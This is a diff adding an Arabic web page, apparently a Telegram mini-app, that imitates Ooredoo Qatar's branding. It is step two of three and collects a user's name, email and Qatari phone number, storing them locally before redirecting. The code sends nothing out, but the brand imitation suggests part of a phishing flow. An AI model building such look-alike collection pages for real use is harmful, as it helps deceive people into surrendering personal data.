@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Ooredoo قطر - المعلومات الشخصية</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --ooredoo-red: #e60000;
+            --ooredoo-hover: #c80000;
+            --bg-color: #f5f5f5;
+            --card-bg: #ffffff;
+            --text-main: #111111;
+            --text-muted: #888888;
+            --input-border: #e2e8f0;
+            --btn-gray: #e8e8e8;
+            --btn-gray-text: #555555;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .app-header {
+            width: 100%;
+            background-color: var(--ooredoo-red);
+            height: 60px;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .back-btn-top {
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .header-title {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            font-size: 20px;
+            font-weight: 800;
+            color: white;
+        }
+
+        .menu-icon {
+            font-size: 24px;
+            cursor: pointer;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .menu-icon span {
+            display: block;
+            width: 22px;
+            height: 3px;
+            background-color: white;
+            border-radius: 2px;
+        }
+
+        .card {
+            background: white;
+            width: 90%;
+            max-width: 440px;
+            margin: 20px 0 30px;
+            padding: 32px 24px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-title {
+            font-size: 26px;
+            color: var(--text-main);
+            margin: 0 0 6px;
+            text-align: center;
+            font-weight: 800;
+        }
+
+        .subtext {
+            font-size: 14px;
+            color: var(--text-muted);
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 0 auto 32px;
+            width: 80%;
+        }
+
+        .step-bar {
+            flex: 1;
+            height: 4px;
+            background-color: #e2e8f0;
+            border-radius: 2px;
+        }
+
+        .step-bar.active {
+            background-color: var(--ooredoo-red);
+        }
+
+        .form-group {
+            margin-bottom: 22px;
+            display: flex;
+            flex-direction: column;
+            text-align: right;
+        }
+
+        .form-group label {
+            font-size: 15px;
+            font-weight: 700;
+            color: #222222;
+            margin-bottom: 10px;
+        }
+
+        .form-control {
+            font-size: 15px;
+            padding: 14px 16px;
+            border: 1px solid var(--input-border);
+            border-radius: 10px;
+            background-color: #ffffff;
+            color: #333333;
+            outline: none;
+            width: 100%;
+            text-align: right;
+        }
+
+        .form-control:focus {
+            border-color: var(--ooredoo-red);
+        }
+
+        .phone-group {
+            display: flex;
+            gap: 10px;
+            direction: ltr;
+        }
+
+        .country-prefix {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            background-color: #f5f5f5;
+            border: 1px solid var(--input-border);
+            border-radius: 10px;
+            padding: 0 14px;
+            font-weight: 700;
+            font-size: 15px;
+            color: #111111;
+        }
+
+        .phone-hint {
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-top: 8px;
+            text-align: right;
+        }
+
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        .btn-prev {
+            background-color: var(--btn-gray);
+            color: var(--btn-gray-text);
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        .btn-next {
+            background-color: var(--ooredoo-red);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        .footer-banner {
+            width: 100%;
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #666666;
+            margin-top: auto;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="app-header">
+    <a onclick="goBack()" class="back-btn-top">→ رجوع</a>
+    <div class="header-title">Ooredoo قطر</div>
+    <div class="menu-icon">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+</div>
+
+<div class="card">
+    <h1 class="main-title">معلومات الاتصال</h1>
+    <div class="subtext">الخطوة 2 من 3</div>
+
+    <div class="step-indicator">
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar"></div>
+    </div>
+
+    <form id="step2Form" onsubmit="goNext(event)">
+        <div class="form-group">
+            <label for="firstName">الاسم الأول</label>
+            <input type="text" id="firstName" class="form-control" placeholder="محمد" required>
+        </div>
+
+        <div class="form-group">
+            <label for="lastName">اسم العائلة</label>
+            <input type="text" id="lastName" class="form-control" placeholder="التيجاني" required>
+        </div>
+
+        <div class="form-group">
+            <label for="email">البريد الإلكتروني</label>
+            <input type="email" id="email" class="form-control" placeholder="mohamed@example.qa" required>
+        </div>
+
+        <div class="form-group">
+            <label for="phone">رقم هاتف Ooredoo قطر</label>
+            <div class="phone-group">
+                <input type="tel" id="phone" class="form-control" placeholder="33123456" maxlength="8" pattern="[3567][0-9]{7}" required style="text-align: right;">
+                <div class="country-prefix">
+                    <span>+974</span>
+                    <span>🇶🇦</span>
+                </div>
+            </div>
+            <div class="phone-hint">8 أقام تبدأ بـ 3، 5، 6 أو 7 (مثال: 33123456)</div>
+        </div>
+
+        <div class="btn-container">
+            <button type="submit" class="btn-next">الخطوة التالية</button>
+            <button type="button" class="btn-prev" onclick="goBack()">السابق</button>
+        </div>
+    </form>
+</div>
+
+<div class="footer-banner">
+    © 2026 Ooredoo Qatar. جميع الحقوق محفوظة.
+</div>
+
+<script>
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        const fName = localStorage.getItem('firstName');
+        const lName = localStorage.getItem('lastName');
+        const email = localStorage.getItem('email');
+        const phone = localStorage.getItem('phone');
+
+        if (fName) document.getElementById('firstName').value = fName;
+        if (lName) document.getElementById('lastName').value = lName;
+        if (email) document.getElementById('email').value = email;
+        if (phone) document.getElementById('phone').value = phone;
+    };
+
+    function goNext(event) {
+        event.preventDefault();
+
+        const fName = document.getElementById('firstName').value.trim();
+        const lName = document.getElementById('lastName').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+
+        if (!fName || !lName || !email || !phone) {
+            alert("يرجى تعبئة كافة الحقول المطلوبة.");
+            return;
+        }
+
+        if (!/^[3567]\d{7}$/.test(phone)) {
+            alert("يرجى إدخال رقم هاتف قطري صالح مكون من 8 أرقام.");
+            return;
+        }
+
+        localStorage.setItem('firstName', fName);
+        localStorage.setItem('lastName', lName);
+        localStorage.setItem('email', email);
+        localStorage.setItem('phone', phone);
+        localStorage.setItem('userPhone', phone);
+
+        window.location.href = "/page4";
+    }
+
+    function goBack() {
+        window.location.href = "/page2";
+    }
+</script>
+
+</body>
+</html>
